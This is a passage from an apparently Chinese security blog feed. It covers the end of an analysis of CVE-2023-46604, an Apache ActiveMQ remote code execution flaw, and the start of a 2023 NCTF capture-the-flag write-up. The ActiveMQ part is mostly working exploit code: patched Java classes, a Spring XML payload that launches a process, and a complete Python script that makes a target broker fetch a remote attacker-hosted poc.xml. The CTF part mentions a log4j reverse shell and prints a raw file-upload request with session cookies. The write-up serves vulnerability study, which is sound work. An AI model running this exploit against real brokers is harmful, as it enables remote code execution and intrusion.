class="string">&quot;yourQueueName&quot;</span>);</span><br><span class="line">            <span class="type">MessageProducer</span> <span class="variable">producer</span> <span class="operator">=</span> session.createProducer(destination);</span><br><span class="line">            <span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createTextMessage(<span class="string">&quot;Hello, OpenWire!&quot;</span>);</span><br><span class="line">            producer.send(message);</span><br><span class="line">            System.out.println(<span class="string">&quot;Message sent successfully.&quot;</span>);</span><br><span class="line">            producer.close();</span><br><span class="line">            session.close();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于这一个已经是 Openwire 协议发包的格式了，所以直接在 <code>org.apache.activemq.openwire.OpenWireFormat#doUnmarshal</code> 方法下断点，来观测调试一下。</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/openwireDebug.png" class><p>往下走，先判断了 dataType 变量的值，专门拿出来看一下，可以看到此处 dataType 为 28，对应数组里面的类为 ActiveMQTextMessageMarsheller。对应的在我的 Producer 生产者里面类为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createTextMessage(<span class="string">&quot;Hello, OpenWire!&quot;</span>);</span><br><span class="line">producer.send(message);</span><br></pre></td></tr></table></figure><p>dataType 为 28</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/datatype28.png" class><p>而我们需要的类是 ExceptionResponseMarshaller，对应 dataType 的值为 31，想办法进行修改。ActiveMQ 的测试类比较粗暴，是直接判断的，而不是正常的 producer 发送消息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>();</span><br><span class="line">r.setException(<span class="keyword">new</span> <span class="title class_">Exception</span>());</span><br><span class="line"><span class="type">ByteSequence</span> <span class="variable">bss</span> <span class="operator">=</span> format.marshal(r);</span><br><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> (ExceptionResponse) format.unmarshal(bss);</span><br></pre></td></tr></table></figure><p>所以此处，我也需要构造一个 ExceptionResponse 类发包，最开始我的尝试是将其作为 message 的一部分，但其实这并没有用，因为最终反序列化还是 <code>TextMessage</code> 这个类。</p><p>尝试了一段时间发现这条路是行不通的，但是最后又是可以 RCE 的，只能从中间的流程部分着手剖析，一点点看了。看了 X1r0z 师傅的分析文章 <a class="link" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a> 才知道原来是另一种方式打的，很有意思。</p><p>首先在 <code>org.apache.activemq.openwire.OpenWireFormat#marshal</code> 系列方法下断点，往前可以看到 TcpTransport 这个类</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/tcpTransport.png" class><p>它的 oneway 方法会调用 <code>wireFormat.marshal()</code> 去序列化 command<br>command 就是前面准备发送的 ObjectMessage, 而 wireFormat 就是和它对应的序列化器<br>那么我们只需要手动 patch 这个方法, 将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/command.png" class><p>在当前源码目录下新建一个 <code>org.apache.activemq.transport.tcp.TcpTransport</code> 类, 然后重写对应的逻辑, 这样在运行的时候, 因为 classpath 查找顺序的问题, 程序就会优先使用当前源码目录里的 TcpTransport 类</p><p>然后是 createThrowable 方法的利用, 这块其实跟 PostgreSQL JDBC 的利用类似, 因为 ActiveMQ 自带 spring 相关依赖, 那么就可以利用 ClassPathXmlApplicationContext 加载 XML 实现 RCE</p><p><strong>TcpTransport.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.checkStarted();</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line">        <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">        <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">        <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>ClassPathXmlApplicationContext.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.context.support;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为在 marshal 的时候会调用 <code>o.getClass().getName()</code> 获取类名, 而 getClass 方法无法重写 (final), 所以我在这里同样 patch 了 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>, 使其继承 Throwable 类</p><p>如此一来就可以打通了，编写恶意 XML 如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/activeMQ-RCE-success<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>先从 Server 这边调试起</p><p>看调用栈是很清晰的，会调到 <code>TcpTransport#oneway</code> 方法</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/debugoneWay.png" class><p>随后根据 classpath 优先级，会优先调用我们自己 patch 的 <code>TcpTransport#oneway</code> 方法，里面定义了一个 ExceptionResponse 类，并将其序列化</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/marshall.png" class><p>接下来就是 Server 部分的处理了</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doUnmarshalFirst.png" class><p>跟进往下走，发现此处的 dataType 被设置成 31 了，对应的类也是 ExceptionResponse</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setDataType31.png" class><p>根据前面分析的逻辑，来到 <code>org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable</code></p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/createThrowable.png" class><p>成功 RCE，流程很清晰明朗</p><h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><p>下面要做一下协议分析的部分，因为这里明确说是 openwire 协议了，wireshark 抓包</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/openwireWireshark.png" class><p>第一个数据包比较像一个 Hello 的数据包，看上去是必要的（不确定），第二个数据包是发包的数据包，第三个数据包则是反序列化的数据包回显。所以我们只需要构造第一个数据包与第二个即可。</p><p>这里我想的是先构造第二个数据包，如果直接第二个数据包发包就可以，就没有必须要加第一个包了。</p><p>搓出来的 Demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, poc</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    new_len = <span class="built_in">len</span>(classname + poc)</span><br><span class="line">    package_data_len = <span class="built_in">ascii</span>(new_len + <span class="number">17</span>)</span><br><span class="line">    Command = <span class="string">&quot;1f&quot;</span>  <span class="comment"># Command: ExceptionResponse(31)</span></span><br><span class="line">    Command_Id = <span class="string">&quot;00000000&quot;</span>  <span class="comment"># Command Id: 00 00 00 00</span></span><br><span class="line">    Command_response_required = <span class="string">&quot;00&quot;</span> <span class="comment"># Command response required: 0</span></span><br><span class="line">    CorrelationId = <span class="string">&quot;00000000&quot;</span> <span class="comment"># CorrelationId: 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        out.write(<span class="built_in">int</span>(package_data_len).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(poc).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(poc.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 exp.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>发包，打不通，明显是不对的，掉了这三个数据包</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/losePack.png" class><p>在任何一个包里面，这两段都是相同的，直接硬编码肯定不太行，需要动调看一下特殊含义。</p><p>前面两个 01 代表的是 true，为 dataIn.readBoolen()</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/onetrue.png" class><p>目前调整了之后就可以了，但是发现没办法读取恶意 poc.xml</p><p>怀疑是第二个部分缺失的问题，怀疑是序列化的数据有问题，后面发现是 Throwable 的问题</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pro2.png" class><p>同样需要 set 为 true，完整 EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, poc</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    new_len = <span class="built_in">len</span>(classname + poc)</span><br><span class="line">    package_data_len = <span class="built_in">ascii</span>(new_len + <span class="number">17</span>)</span><br><span class="line">    Command = <span class="string">&quot;1f&quot;</span>  <span class="comment"># Command: ExceptionResponse(31)</span></span><br><span class="line">    Command_Id = <span class="string">&quot;00000000&quot;</span>  <span class="comment"># Command Id: 00 00 00 00</span></span><br><span class="line">    Command_response_required = <span class="string">&quot;00&quot;</span> <span class="comment"># Command response required: 0</span></span><br><span class="line">    CorrelationId = <span class="string">&quot;00000000&quot;</span> <span class="comment"># CorrelationId: 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        out.write(<span class="built_in">int</span>(package_data_len).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(poc).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(poc.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 exp.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>其实就是前面的 patch</p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>确实是一个很有意思的洞，学到了 patch 的手法，很有意思</p><p>最后的通过分析协议来编写 EXP 也挺好玩的。</p><h2 id="0x07-Ref"><a href="#0x07-Ref" class="headerlink" title="0x07 Ref"></a>0x07 Ref</h2><p>X1r0z tqlllllllllll</p><p><a class="link" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-46604 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2023 NCTF WP</title>
    <link href="https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/</id>
    <published>2023-12-27T08:08:39.000Z</published>
    <updated>2023-12-27T08:10:35.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023-NCTF-WP"><a href="#2023-NCTF-WP" class="headerlink" title="2023 NCTF WP"></a>2023 NCTF WP</h1><h2 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h2><p>log4j2</p><p>和原本的区别是没有 Logger 一系列 api。但是用 Accept 头修改就可以</p><img src="/2023/12/27/2023-NCTF-WP/log4j.png" class><p>反弹 shell 拿 flag</p><img src="/2023/12/27/2023-NCTF-WP/flag1.png" class><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>很 realworld 的一道题目，出的挺好的，就是一开始的思路没想到。然后踩了很多坑。</p><p>先用 wpscan 扫，做信息收集。</p><ul><li>Wordpress 版本是 6.4.1 有 POP 链漏洞。</li><li>all-in-one-video-gallery 插件版本是 2.6.4，有任意文件读取 &amp; SSRF 的洞。</li><li>contact-form-7 这里提供了文件上传的功能。Version: 5.8.4</li><li>drag-and-drop-multiple-file-upload-contact-form-7，Version：1.3.6.2；也是文件上传的点。</li></ul><p>这里的思路是很特别的，phar + SSRF，所以说这个题目真的很 RealWorld</p><p>通过任意文件上传，这里我们可以上传一个 phar 文件，由于 phar 协议对于后缀是无所谓的，所以这里上传 jpg 就可以了。</p><p>但是要构造这个 HTTP 请求需要自己起一个环境，然后配置 drag-and-drop-multiple-file-upload-contact-form-7 插件的文件上传。这个插件最后是在文章评论里面能够上传文件，出题人把 CSS 都删掉了， 导致只能自己起环境。</p><p>最终的文件上传的 HTTP 包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1100</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary4iNAMw9WsXYpvRh5</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.155.130:8080</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.155.130:8080/2023/12/23/hello-world/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C1613ac86565afa28de016afa707f293446d531968efbbfe134f2c39f9116fd8c; wordpress_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C84448144083da56f705baf56db136311c0121a1ac9f0f942cee38c9407ebd8f5; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C8bbeecd37213bac95528f20b5a6714b63984d4caf8c83e032c3e2d3e6e08c931; aiovg_rand_seed=4191310244; wp_lang=zh_CN; wordpress_logged_in_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C8d30bb0f69143395c98c0e2fde270c1236a715c34584cc2ab3755c7fc3bdf982; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1703334790</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;size_limit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">15555555555</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;action&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">dnd_codedropz_upload</span></span><br><span class="line"><span 